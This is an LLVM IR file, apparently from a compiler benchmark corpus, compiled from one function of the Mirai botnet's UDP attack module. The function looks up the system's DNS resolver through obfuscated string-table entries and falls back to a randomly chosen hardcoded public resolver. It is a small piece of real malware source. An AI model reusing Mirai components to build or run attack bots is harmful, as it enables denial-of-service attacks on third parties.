; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_get_dns_resolver.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack_udp.c_get_dns_resolver.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@TABLE_ATK_RESOLVER = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4
@TABLE_ATK_NSERV = common dso_local global i32 0, align 4
@FALSE = common dso_local global i64 0, align 8
@TRUE = common dso_local global i64 0, align 8
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 ()* @get_dns_resolver to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i8, align 1
  %11 = load i32, i32* @TABLE_ATK_RESOLVER, align 4
  %12 = call i32 @table_unlock_val(i32 %11)
  %13 = load i32, i32* @TABLE_ATK_RESOLVER, align 4
  %14 = call i32 @table_retrieve_val(i32 %13, i32* null)
  %15 = load i32, i32* @O_RDONLY, align 4
  %16 = call i32 @open(i32 %14, i32 %15)
  store i32 %16, i32* %2, align 4
  %17 = load i32, i32* @TABLE_ATK_RESOLVER, align 4
  %18 = call i32 @table_lock_val(i32 %17)
  %19 = load i32, i32* %2, align 4
  %20 = icmp sge i32 %19, 0
  br i1 %20, label %21, label %110

21:                                               ; preds = %0
  %22 = load i32, i32* %2, align 4
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %24 = call i32 @read(i32 %22, i8* %23, i32 2048)
  store i32 %24, i32* %3, align 4
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @close(i32 %25)
  %27 = load i32, i32* @TABLE_ATK_NSERV, align 4
  %28 = call i32 @table_unlock_val(i32 %27)
  %29 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %30 = load i32, i32* %3, align 4
  %31 = load i32, i32* @TABLE_ATK_NSERV, align 4
  %32 = call i32 @table_retrieve_val(i32 %31, i32* null)
  %33 = call i32 @util_stristr(i8* %29, i32 %30, i32 %32)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* @TABLE_ATK_NSERV, align 4
  %35 = call i32 @table_lock_val(i32 %34)
  %36 = load i32, i32* %4, align 4
  %37 = icmp ne i32 %36, -1
  br i1 %37, label %38, label %109

38:                                               ; preds = %21
  %39 = load i64, i64* @FALSE, align 8
  store i64 %39, i64* %8, align 8
  %40 = load i64, i64* @FALSE, align 8
  store i64 %40, i64* %9, align 8
  %41 = load i32, i32* %4, align 4
  store i32 %41, i32* %6, align 4
  br label %42

42:                                               ; preds = %99, %38
  %43 = load i32, i32* %6, align 4
  %44 = load i32, i32* %3, align 4
  %45 = icmp slt i32 %43, %44
  br i1 %45, label %46, label %102

46:                                               ; preds = %42
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  store i8 %50, i8* %10, align 1
  %51 = load i64, i64* %8, align 8
  %52 = icmp ne i64 %51, 0
  br i1 %52, label %65, label %53

53:                                               ; preds = %46
  %54 = load i8, i8* %10, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 32
  br i1 %56, label %61, label %57

57:                                               ; preds = %53
  %58 = load i8, i8* %10, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 9
  br i1 %60, label %61, label %62

61:                                               ; preds = %57, %53
  br label %99

62:                                               ; preds = %57
  %63 = load i64, i64* @TRUE, align 8
  store i64 %63, i64* %8, align 8
  br label %64

64:                                               ; preds = %62
  br label %65

65:                                               ; preds = %64, %46
  %66 = load i8, i8* %10, align 1
  %67 = sext i8 %66 to i32
  %68 = icmp ne i32 %67, 46
  br i1 %68, label %69, label %77

69:                                               ; preds = %65
  %70 = load i8, i8* %10, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp slt i32 %71, 48
  br i1 %72, label %82, label %73

73:                                               ; preds = %69
  %74 = load i8, i8* %10, align 1
  %75 = sext i8 %74 to i32
  %76 = icmp sgt i32 %75, 57
  br i1 %76, label %82, label %77

77:                                               ; preds = %73, %65
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %3, align 4
  %80 = sub nsw i32 %79, 1
  %81 = icmp eq i32 %78, %80
  br i1 %81, label %82, label %98

82:                                               ; preds = %77, %73, %69
  %83 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %84 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %85 = load i32, i32* %4, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  %88 = load i32, i32* %6, align 4
  %89 = load i32, i32* %4, align 4
  %90 = sub nsw i32 %88, %89
  %91 = call i32 @util_memcpy(i8* %83, i8* %87, i32 %90)
  %92 = load i32, i32* %6, align 4
  %93 = load i32, i32* %4, align 4
  %94 = sub nsw i32 %92, %93
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %95
  store i8 0, i8* %96, align 1
  %97 = load i64, i64* @TRUE, align 8
  store i64 %97, i64* %9, align 8
  br label %102

98:                                               ; preds = %77
  br label %99

99:                                               ; preds = %98, %61
  %100 = load i32, i32* %6, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %6, align 4
  br label %42

102:                                              ; preds = %82, %42
  %103 = load i64, i64* %9, align 8
  %104 = icmp ne i64 %103, 0
  br i1 %104, label %105, label %108

105:                                              ; preds = %102
  %106 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %107 = call i32 @inet_addr(i8* %106)
  store i32 %107, i32* %1, align 4
  br label %121

108:                                              ; preds = %102
  br label %109

109:                                              ; preds = %108, %21
  br label %110

110:                                              ; preds = %109, %0
  %111 = call i32 (...) @rand_next()
  %112 = srem i32 %111, 4
  switch i32 %112, label %121 [
    i32 0, label %113
    i32 1, label %115
    i32 2, label %117
    i32 3, label %119
  ]

113:                                              ; preds = %110
  %114 = call i32 @INET_ADDR(i32 8, i32 8, i32 8, i32 8)
  store i32 %114, i32* %1, align 4
  br label %121

115:                                              ; preds = %110
  %116 = call i32 @INET_ADDR(i32 74, i32 82, i32 42, i32 42)
  store i32 %116, i32* %1, align 4
  br label %121

117:                                              ; preds = %110
  %118 = call i32 @INET_ADDR(i32 64, i32 6, i32 64, i32 6)
  store i32 %118, i32* %1, align 4
  br label %121

119:                                              ; preds = %110
  %120 = call i32 @INET_ADDR(i32 4, i32 2, i32 2, i32 2)
  store i32 %120, i32* %1, align 4
  br label %121

121:                                              ; preds = %105, %113, %115, %117, %119, %110
  %122 = load i32, i32* %1, align 4
  ret i32 %122
}

declare dso_local i32 @table_unlock_val(i32) #1

declare dso_local i32 @open(i32, i32) #1

declare dso_local i32 @table_retrieve_val(i32, i32*) #1

declare dso_local i32 @table_lock_val(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @util_stristr(i8*, i32, i32) #1

declare dso_local i32 @util_memcpy(i8*, i8*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i32 @INET_ADDR(i32, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
